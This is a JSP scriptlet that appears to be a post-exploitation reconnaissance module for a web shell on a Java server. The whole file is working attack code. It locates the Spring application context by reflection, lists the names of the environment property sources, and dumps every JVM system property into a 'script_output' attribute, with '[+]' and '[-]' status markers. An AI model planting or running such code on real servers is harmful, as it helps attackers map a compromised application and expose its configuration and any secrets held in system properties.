<%
StringBuilder output = new StringBuilder();

try {

    Class.forName("org.springframework.web.context.WebApplicationContext");

    Object ctx = request.getAttribute("org.springframework.web.servlet.DispatcherServlet.CONTEXT");
    if (ctx == null) {
        javax.servlet.ServletContext sc = application;
        ctx = sc.getAttribute("org.springframework.web.context.WebApplicationContext.ROOT");
    }
    
    if (ctx == null) {
        output.append("Spring context not found (try accessing via a Spring endpoint first)\n");
    } else {

        try {
            java.lang.reflect.Method getEnvironment = ctx.getClass().getMethod("getEnvironment");
            Object env = getEnvironment.invoke(ctx);
            java.lang.reflect.Method getPropertySources = env.getClass().getMethod("getPropertySources");
            Object sources = getPropertySources.invoke(env);
            
            output.append("[+] Spring Environment Properties:\n");
            for (java.util.Iterator it = ((java.lang.Iterable) sources).iterator(); it.hasNext(); ) {
                Object source = it.next();
                try {
                    java.lang.reflect.Method getName = source.getClass().getMethod("getName");
                    output.append("  Source: ").append(getName.invoke(source)).append("\n");
                } catch (Exception e) {}
            }
        } catch (Exception e) {
            output.append("[-] Environment dump failed: ").append(e.getMessage()).append("\n");
        }

        output.append("\n[+] System Properties:\n");
        java.util.Properties props = System.getProperties();
        for (String key : props.stringPropertyNames()) {
            output.append(key).append("=").append(props.getProperty(key)).append("\n");
        }
    }
    
} catch (ClassNotFoundException e) {
    output.append("ERROR: Spring not available\n");
} catch (Exception e) {
    output.append("ERROR: Spring recon failed - ").append(e.toString()).append("\n");
}

request.setAttribute("script_output", output.toString());
%>
